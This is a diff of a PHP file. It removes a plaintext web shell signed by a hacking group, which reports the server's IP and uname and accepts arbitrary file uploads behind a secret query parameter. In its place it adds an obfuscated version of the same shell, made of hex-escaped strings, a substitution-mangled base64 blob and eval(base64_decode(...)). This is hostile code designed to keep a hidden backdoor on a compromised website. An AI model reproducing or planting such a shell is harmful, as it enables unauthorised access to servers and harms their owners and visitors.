@@ -1,31 +1,3 @@
-<?php
-/**
-Author : Frank WiX
-FB: https://fb.com/WiX3CA
-3xp1r3 Cyber Army 
-**/
-error_reporting(0);
-echo "Frank Wix <br> Server IP : ";
-echo gethostbyname($_SERVER["HTTP_HOST"]);
-echo "<br> Uname : ";
-echo php_uname();
-echo "<br>";
-if($_GET['up']=="l0ad"){
-if(isset($_POST['Submit'])){
-	$filedir = ""; 
-	$maxfile = '2000000';
-	$mode = '0644';
-	$userfile_name = $_FILES['image']['name'];
-	$userfile_tmp = $_FILES['image']['tmp_name'];
-	if(isset($_FILES['image']['name'])) {
-		$qx = $filedir.$userfile_name;
-		@move_uploaded_file($userfile_tmp, $qx);
-		@chmod ($qx, octdec($mode));
-echo" <a href=$userfile_name><center><b> $userfile_name</b></center></a>";
-}}
-else{
-echo'<form method="POST" action="#" enctype="multipart/form-data"><input type="file" name="image"><br><input type="Submit" name="Submit" value="Upload"></form>';
-}
-echo '</center>';
-}
+<?php $g="\x34";$k="\x53\x68\x41\x47\x56\x41\x75\x4b";$y = str_replace($k, $g,'JGc9IlxShAGVAuKMzAiOyRrPSJceDczXHg2YlxShAGVAuKNjRceDZhXHg2YlxShAGVAuKNmNceDczXHg2NFxShAGVAuKNzNceDYxXHg2OFxShAGVAuKNzNceDY3IjskeSA9IHN0cl9yZXBsYWNlKCRrLCRnLCdMeW9xRFFwQmRYUm9iM0lnT2lCR2NtRnVheUJYYVZnTkNrWkNPaUJvZEhSd2N6b3ZMMlppTG1OdmJTOVhhVmd6UXNrZGprbHNkc2Foc2dFTkNqTjRjREZ5TXlCRGVXSmxjaUJCY20xNUlBc2tkamtsc2RzYWhzZ0tLaW92RFFwbGNuSnZjbDl5WlhCdmNuUnBibWNvTUNrN0RRcGxZMmh2SUNKR2NtRnVheUJYYVhnZ1BHSnlQaUJUWlhKMlpYSWdTVkFnT2lBaU93c2tkamtsc2RzYWhzZ0taV05vYnlCblpYUm9iM05za2Rqa2xzZHNhaHNnWW5sdVlXMWxLQ1JmVXNrZGprbHNkc2Foc2dWU1ZrVlNXeUpJVkZSUVhza2Rqa2xzZHNhaHNnaFBVMVFpWFNrN0RRcGxZMmh2SUNJOFluSStJRlZ1WVcxbElEb2dJanNOQ21WamFHOGdjR2h3WDNWdVlXMWxLQ2s3RFFwbFkyaHZJQ0kShAGVAuKWW5JK0lqc05DbWxtS0NSZlJza2Rqa2xzZHNhaHNnVlVXeWQxY0NkZFBUc2tkamtsc2RzYWhzZ2liREJoWkNJcGV3c2tkamtsc2RzYWhzZ0thV1lvYVhOelpYUW9KRjlRVDFOVVd5ZFRkV0p0YVhRblhTa3Bld3NrZGprbHNkc2Foc2dLQ1NSbWFXeGxaR2x5SURza2Rqa2xzZHNhaHNnZ0lpSTdJQXNrZGprbHNkc2Foc2dLQ1NSdFlYaG1hV3hsSURza2Rqa2xzZHNhaHNnZ0p6SXdNREF3TURBbk93c2tkamtsc2RzYWhzZ0tDU1J0YjJSbElEc2tkamtsc2RzYWhzZ2dKekEyTkRRbk93c2tkamtsc2RzYWhzZ0tDU1IxYzJWeVptbHNaVjl1WVcxbElEc2tkamtsc2RzYWhzZ2dKRjlHU1VShAGVAuKRlUxc25hVzFoWjJVblhWc25ibUZ0WlNkZE93c2tkamtsc2RzYWhzZ0tDU1IxYzJWeVptbHNaVjlza2Rqa2xzZHNhaHNnYlhBZ1BTQWtYc2tkamtsc2RzYWhzZ1pKVEVWVFd5ZHBiV0ZuWlNkZFd5ZHNrZGprbHNkc2Foc2diWEJmYm1GdFpTZGRPd3NrZGprbHNkc2Foc2dLQ1dsbUtHbHpjMlZza2Rqa2xzZHNhaHNnS0NSZlJrbE1SVk5iSjJsdFlXZGxKMTFiSjI1aGJXVW5YU2twSUhzTkNna0pKSEY0SURza2Rqa2xzZHNhaHNnZ0pHWnBiR1ZrYVhJdUpIVnpaWEptYVdShAGVAuKbFgyNWhiV1U3RFFvSkNVQnRiM1psWDNWd2JHOWhaR1ZrWDJacGJHVW9KSFZ6WlhKbWFXeGxYM1J0Y0N3Z0pIRjRLVHNOQ2drSlFHTm9iVzlrSUNna2NYZ3NJRzlqZEdSbFl5Z2tiVzlrWlNrcE93c2tkamtsc2RzYWhzZ0taV05vYnlJZ1BHRWdhSEpsWmpza2Rqa2xzZHNhaHNna2RYTmxjbVpwYkdWZmJtRnRaVDQShAGVAuKWTJWdWRHVnlQanhpUGlBa2RYTmxjbVpwYkdWZmJtRnRaVHd2WWo0OEwyTmxiblJsY2o0OEwyRStJanNOQ2ShAGVAuKxOURRcGxiSE5sZXdza2Rqa2xzZHNhaHNnS1pXTm9ieWMShAGVAuKWm05eWJTQnRaWFJvYjJROUlsQlBVMVFpSUdGamRHbHZianNrZGprbHNkc2Foc2dpSXlJZ1pXNWpkSGx3WlRza2Rqa2xzZHNhaHNnaWJYVnNkR2x3WVhKc2tkamtsc2RzYWhzZ0wyWnZjbXNrZGprbHNkc2Foc2d0WkdGc2tkamtsc2RzYWhzZ1lTSStQR2x1Y0hWc2tkamtsc2RzYWhzZ0lIUjVjR1U5SW1acGJHVWlJRzVoYldVOUltbHRZV2RsSWo0OFluSStQR2x1Y0hWc2tkamtsc2RzYWhzZ0lIUjVjR1U5SWxOMVltMXBkQ0lnYm1GdFpUc2tkamtsc2RzYWhzZ2lVM1ZpYldsc2tkamtsc2RzYWhzZ0lpQjJZV3gxWlRza2Rqa2xzZHNhaHNnaVZYQnNiMkZrSWo0OEwyWnZjbXNrZGprbHNkc2Foc2crSnpzTkNuc2tkamtsc2RzYWhzZ05DbVZqYUcShAGVAuKZ0p6d3ZZMlZ1ZEdWeVBpYzdEUXA5Jyk7ZXZhbChiYXNlNjRfZGVjb2RlKCR5KSk7');eval(base64_decode($y));
 ?>
+
